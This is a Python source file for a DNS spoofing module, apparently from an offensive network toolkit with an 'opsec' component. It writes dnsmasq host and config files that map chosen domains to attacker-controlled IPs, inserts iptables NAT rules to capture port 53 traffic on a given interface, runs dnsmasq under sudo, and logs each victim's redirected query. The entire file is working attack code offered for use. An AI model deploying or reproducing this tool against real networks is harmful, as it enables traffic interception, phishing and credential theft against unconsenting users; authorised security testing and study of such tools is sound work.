"""DNS Spoof module — redirect specific domains to attacker-controlled IPs."""

from __future__ import annotations

import contextlib
import os
import subprocess
import tempfile
import threading
import time
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

from ..core.config import Config
from ..core.logger import get_logger
from ..core.opsec import OpsecEngine

console = Console()
log = get_logger("dnsspoof")


@dataclass
class SpoofRule:
    domain: str
    redirect_ip: str
    wildcard: bool = False


@dataclass
class SpoofedQuery:
    timestamp: str
    source_ip: str
    domain: str
    redirected_to: str


class DnsSpoofModule:
    def __init__(self, config: Config, opsec: OpsecEngine) -> None:
        self.config = config
        self.opsec = opsec
        self.rules: list[SpoofRule] = []
        self.spoofed_queries: list[SpoofedQuery] = []
        self._running = False
        self._proc: subprocess.Popen | None = None
        self._interface: str | None = None
        self._tmp_files: list[str] = []

    def add_rule(self, domain: str, redirect_ip: str, wildcard: bool = False) -> None:
        rule = SpoofRule(domain=domain, redirect_ip=redirect_ip, wildcard=wildcard)
        self.rules.append(rule)
        console.print(
            f"[dim]DNS rule: {'*.' if wildcard else ''}{domain} → {redirect_ip}[/dim]"
        )

    def start(self, interface: str) -> bool:
        if not self.rules:
            console.print("[red]No DNS spoof rules configured[/red]")
            return False

        self.opsec.pre_operation()
        self._running = True
        self._interface = interface

        hosts_path, extra_conf_path = self._build_config_files()

        self._redirect_dns(interface)

        cmd = [
            "sudo", "dnsmasq",
            "--no-daemon",
            "--no-resolv",
            f"--interface={interface}",
            "--server=8.8.8.8",
            "--log-queries",
            "--log-facility=-",
        ]
        if hosts_path:
            cmd.append(f"--addn-hosts={hosts_path}")
        if extra_conf_path:
            cmd.append(f"--conf-file={extra_conf_path}")

        self._proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )

        monitor_thread = threading.Thread(
            target=self._monitor_queries, daemon=True,
        )
        monitor_thread.start()

        log.info("DNS spoofing active: %d rules on %s", len(self.rules), interface)
        console.print(f"[green]DNS spoofing active — {len(self.rules)} rules[/green]")
        return True

    def stop(self) -> list[SpoofedQuery]:
        self._running = False
        if self._proc:
            self._proc.terminate()
            try:
                self._proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._proc.kill()
                self._proc.wait()
            self._proc = None

        self._restore_dns()

        for path in self._tmp_files:
            with contextlib.suppress(FileNotFoundError):
                os.unlink(path)
        self._tmp_files.clear()

        console.print(f"[yellow]DNS spoofing stopped — {len(self.spoofed_queries)} queries spoofed[/yellow]")
        return self.spoofed_queries

    def _build_config_files(self) -> tuple[str | None, str | None]:
        hosts_lines = []
        conf_lines = []
        for rule in self.rules:
            if rule.wildcard:
                conf_lines.append(f"address=/.{rule.domain}/{rule.redirect_ip}")
            else:
                hosts_lines.append(f"{rule.redirect_ip} {rule.domain}")

        hosts_path = None
        if hosts_lines:
            fd, hosts_path = tempfile.mkstemp(prefix="voidfreq_dns_", suffix="_hosts")
            with os.fdopen(fd, "w") as f:
                f.write("\n".join(hosts_lines) + "\n")
            self._tmp_files.append(hosts_path)

        conf_path = None
        if conf_lines:
            fd, conf_path = tempfile.mkstemp(prefix="voidfreq_dns_", suffix=".conf")
            with os.fdopen(fd, "w") as f:
                f.write("\n".join(conf_lines) + "\n")
            self._tmp_files.append(conf_path)

        return hosts_path, conf_path

    def _redirect_dns(self, interface: str) -> None:
        subprocess.run(
            ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", interface, "-p", "udp", "--dport", "53",
             "-j", "REDIRECT", "--to-port", "53"],
            capture_output=True,
        )
        subprocess.run(
            ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", interface, "-p", "tcp", "--dport", "53",
             "-j", "REDIRECT", "--to-port", "53"],
            capture_output=True,
        )

    def _restore_dns(self) -> None:
        if not self._interface:
            return
        subprocess.run(
            ["sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
             "-i", self._interface, "-p", "udp", "--dport", "53",
             "-j", "REDIRECT", "--to-port", "53"],
            capture_output=True,
        )
        subprocess.run(
            ["sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
             "-i", self._interface, "-p", "tcp", "--dport", "53",
             "-j", "REDIRECT", "--to-port", "53"],
            capture_output=True,
        )

    def _monitor_queries(self) -> None:
        proc = self._proc
        if not proc or not proc.stdout:
            return

        spoofed_domains = {r.domain for r in self.rules}

        while self._running and proc.poll() is None:
            line = proc.stdout.readline().strip()
            if not line or "query" not in line.lower():
                continue

            for domain in spoofed_domains:
                if domain in line:
                    query = SpoofedQuery(
                        timestamp=time.strftime("%H:%M:%S"),
                        source_ip=self._extract_ip(line),
                        domain=domain,
                        redirected_to=next(
                            (r.redirect_ip for r in self.rules if r.domain == domain),
                            "unknown",
                        ),
                    )
                    self.spoofed_queries.append(query)
                    console.print(
                        f"[red]SPOOFED: {query.source_ip} → {domain} "
                        f"→ {query.redirected_to}[/red]"
                    )

    def _extract_ip(self, line: str) -> str:
        import re
        match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
        return match.group(1) if match else "unknown"

    def display_rules(self) -> None:
        table = Table(title="DNS Spoof Rules")
        table.add_column("Domain", style="cyan")
        table.add_column("Redirect To", style="red")
        table.add_column("Wildcard", justify="center")

        for rule in self.rules:
            table.add_row(
                rule.domain, rule.redirect_ip,
                "✓" if rule.wildcard else "✗",
            )

        console.print(table)

    def display_log(self) -> None:
        table = Table(title="Spoofed DNS Queries")
        table.add_column("Time", style="dim")
        table.add_column("Source", style="cyan")
        table.add_column("Domain", style="yellow")
        table.add_column("Redirected To", style="red")

        for q in self.spoofed_queries[-30:]:
            table.add_row(q.timestamp, q.source_ip, q.domain, q.redirected_to)

        console.print(table)
